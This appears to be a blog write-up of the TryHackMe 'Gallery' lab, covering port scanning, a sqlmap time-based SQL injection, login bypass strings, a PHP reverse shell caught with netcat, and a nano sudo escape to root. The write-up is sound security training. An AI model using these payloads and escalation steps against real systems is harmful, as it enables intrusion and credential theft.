---
layout: post
author: L0
---

# THM-Gallery
![image](/images/Pasted image 20230822135500.png)

[TryHackMe - Gallery](https://tryhackme.com/room/gallery666)

## Enumeration
### nmap
```shell
$ nmap -sV -p- gallery

Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-22 07:56 EDT
Nmap scan report for gallery (10.10.181.166)
Host is up (0.039s latency).
rDNS record for 10.10.181.166: gallery.thm
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

```

nmap returend only 2 open ports. both apache webserver.

under port *80* is just the default apache webpage.
port *8080* reveals a login page to a image gallery system.

![image](/images/Pasted image 20230822135938.png)

### directory fuzzing
```shell
$ ffuf -w `fzf-wordlist` -u http://gallery.thm/gallery/FUZZ -e ".php"

htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 38ms]
.hta.php                [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 40ms]
.htaccess.php           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 40ms]
.htpasswd.php           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 39ms]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 46ms]
.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 47ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 50ms]
                        [Status: 200, Size: 16950, Words: 3285, Lines: 349, Duration: 53ms]
albums                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 37ms]
archives                [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 36ms]
assets                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 36ms]
build                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 37ms]
classes                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 36ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 45ms]
create_account.php      [Status: 200, Size: 8, Words: 1, Lines: 1, Duration: 38ms]
database                [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 35ms]
dist                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 35ms]
home.php                [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 36ms]
inc                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 38ms]
index.php               [Status: 200, Size: 16950, Words: 3285, Lines: 349, Duration: 41ms]
index.php               [Status: 200, Size: 16950, Words: 3285, Lines: 349, Duration: 47ms]
login.php               [Status: 200, Size: 8047, Words: 1372, Lines: 176, Duration: 46ms]
plugins                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 36ms]
report                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 36ms]
uploads                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 38ms]
user                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 39ms]

```

i got a few hits with directory fuzzing but i found nothing helpful for now.

### sqlmap
then i saved the login request with *burpsuite* to use it with *sqlmap* like this.

```shell
$ sqlmap -r login.request

[08:11:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[08:11:32] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[08:11:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[08:11:38] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[08:11:39] [INFO] target URL appears to be UNION injectable with 10 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[08:11:46] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
[08:11:46] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 158 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=user' AND (SELECT 9965 FROM (SELECT(SLEEP(5)))DnOj) AND 'bjhL'='bjhL&password=pass
---
[08:12:04] [INFO] the back-end DBMS is MySQL
```

and *sqlmap* found a time-based SQL injection.

```shell
$ sqlmap -r login.request --dbs

available databases [2]:
[*] gallery_db
[*] information_schema
```

two databases where found.

```shell
$ sqlmap -r login.request -D gallery_db --tables

[4 tables]
+-------------+
| album_list  |
| images      |
| system_info |
| users       |
+-------------+
```

**gallery_db** has 4 tables. the useful one might be the **user** table.

```shell
$ sqlmap -r login.request -D gallery_db -T users --columns

[10 columns]
+--------------+--------------+
| Column       | Type         |
+--------------+--------------+
| avatar       | text         |
| date_added   | datetime     |
| date_updated | datetime     |
| firstname    | varchar(250) |
| id           | int(50)      |
| last_login   | datetime     |
| lastname     | varchar(250) |
| password     | text         |
| type         | tinyint(1)   |
| username     | text         |
+--------------+--------------+

```

i want to dump the columns *username* and *password*

```shell
$ sqlmap -r login.request -D gallery_db -T users -C username,password --dump

[1 entry]
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | a228b12a08b6527e7978cbe5d914531c |
+----------+----------------------------------+
```
### SQLI and Reverse Shell
i got the password hash of admin, that also was a question in the box description. but unfortunately i could not crack the hash.

![image](/images/Pasted image 20230822222301.png)

i went back to the login page and checked the response of a failed login attempt with *burp suite*. and i saw the actual query that gets called. so i could forge a payload that lets me bypass it.

username: `a' OR '1=1`
password: `') OR ('1=1`

![image](/images/Pasted image 20230822223148.png)

and we are in.

![image](/images/Pasted image 20230822223223.png)

next i uploaded a *php-reverse-shell* as a image file. no filtering is happening.

```shell
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.1.199] from (UNKNOWN) [10.10.58.13] 53840
Linux gallery 4.15.0-167-generic #175-Ubuntu SMP Wed Jan 5 01:56:07 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 20:33:18 up 15 min,  0 users,  load average: 0.00, 0.05, 0.11
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```
## Privileges Escalation
i have a shell but could not find anything useful. for most of the files in the home directory of the user *mike* i had to low privileges.

```shell
drwxr-xr-x 6 mike mike 4.0K Aug 25  2021 .
drwxr-xr-x 4 root root 4.0K May 20  2021 ..
-rw------- 1 mike mike  135 May 24  2021 .bash_history
-rw-r--r-- 1 mike mike  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 mike mike 3.7K May 20  2021 .bashrc
drwx------ 3 mike mike 4.0K May 20  2021 .gnupg
drwxrwxr-x 3 mike mike 4.0K Aug 25  2021 .local
-rw-r--r-- 1 mike mike  807 Apr  4  2018 .profile
drwx------ 2 mike mike 4.0K May 24  2021 documents
drwx------ 2 mike mike 4.0K May 24  2021 images
-rwx------ 1 mike mike   32 May 14  2021 user.txt

```

after a longer search i found a backup folder with a backup of mikes home directory. 

```shell
www-data@gallery:/var/backups/mike_home_backup/documents$ cat accounts.txt
Spotify : mike@gmail.com:mycat666
Netflix : mike@gmail.com:123456789pass
TryHackme: mike:darkhacker123
```

i found a **accounts.txt** but not a single password worked. again a rabbit hole.

but i looked again for the hidden files and now i could read the **.bash_history**.

```
...
cd html
ls -al
cat index.html
sudo -lb3stpassw0rdbr0xx
clear
sudo -l
...
```

and here i found the password. typed as clear text because he forgot to press return after `sudo -l`

> with `su mike` and entering the password.
> i switched to the **mike** user
{: .prompt-info}

first i went to the home directory and grabbed the first flag.

```shell
mike@gallery:/opt$ cd /home/mike
mike@gallery:~$ cat user.txt
THM{af0*********************ef}
```

### root
after that i began to check for ways to become root.

```
mike@gallery:/opt$ sudo -l
Matching Defaults entries for mike on gallery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

the command `sudo -l` got me the info that i can execute  `/opt/rootkit.sh` with sudo permissions.
this is the content of the script:

```bash
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

i recognized that i am executing nano with sudo privileges when i choose "read" as option. checking [GTFOBINS](https://gtfobins.github.io/gtfobins/nano/#sudo) got me the next step.

![image](/images/Pasted image 20230822231237.png)

after getting into *command mode* in nano with `CTRL + R` and `CTRL + X`

![image](/images/Pasted image 20230822231214.png)

i just needed to type `reset; sh 1>&0 2>&0` to get a root shell.

```shell
# cd /root
# ls
report.txt  root.txt
# cat root.txt
THM{ba*********************************87}
```

going to `/root` i found the last flag in `root.txt`

[L0]
